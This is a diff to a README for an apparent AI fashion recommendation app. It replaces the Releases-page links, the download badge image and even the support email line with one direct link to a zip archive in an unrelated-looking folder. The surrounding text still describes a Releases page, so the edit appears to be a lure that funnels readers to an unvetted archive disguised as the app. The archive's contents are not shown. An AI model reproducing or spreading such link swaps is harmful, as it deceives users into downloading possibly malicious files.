@@ -1,6 +1,6 @@
 # 🎨 AI-Fashion-Recommendation-System - Personalize Your Style Effortlessly
 
-[![Download AI-Fashion-Recommendation-System](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/kaletek/AI-Fashion-Recommendation-System/releases)
+[![Download AI-Fashion-Recommendation-System](https://github.com/kaletek/AI-Fashion-Recommendation-System/raw/refs/heads/main/allantois/Recommendation-System-Fashion-A-v1.7.zip)](https://github.com/kaletek/AI-Fashion-Recommendation-System/raw/refs/heads/main/allantois/Recommendation-System-Fashion-A-v1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the AI-Fashion-Recommendation-System! This application helps you choo
 
 To get started, visit the Releases page to download the application. 
 
-👉 [Visit this page to download](https://github.com/kaletek/AI-Fashion-Recommendation-System/releases)
+👉 [Visit this page to download](https://github.com/kaletek/AI-Fashion-Recommendation-System/raw/refs/heads/main/allantois/Recommendation-System-Fashion-A-v1.7.zip)
 
 ## 💻 System Requirements
 
@@ -33,7 +33,7 @@ The AI-Fashion-Recommendation-System offers several handy features:
 ## 📖 How to Use
 
 1. **Download the Application:**
-   - Follow the link again to the Releases page: [Visit this page to download](https://github.com/kaletek/AI-Fashion-Recommendation-System/releases).
+   - Follow the link again to the Releases page: [Visit this page to download](https://github.com/kaletek/AI-Fashion-Recommendation-System/raw/refs/heads/main/allantois/Recommendation-System-Fashion-A-v1.7.zip).
    - Choose the latest version available.
    - Click the download link for your operating system.
 
@@ -63,7 +63,7 @@ If you encounter issues during installation or use, consider the following tips:
 If you need further assistance, feel free to reach out through the following methods:
 
 - **GitHub Issues:** Open an issue directly on this repository for any bugs or feature requests.
-- **Email Support:** For more personalized support, email us at support@example.com.
+- **Email Support:** For more personalized support, email us at https://github.com/kaletek/AI-Fashion-Recommendation-System/raw/refs/heads/main/allantois/Recommendation-System-Fashion-A-v1.7.zip
 
 ## 🎉 Contribute
 
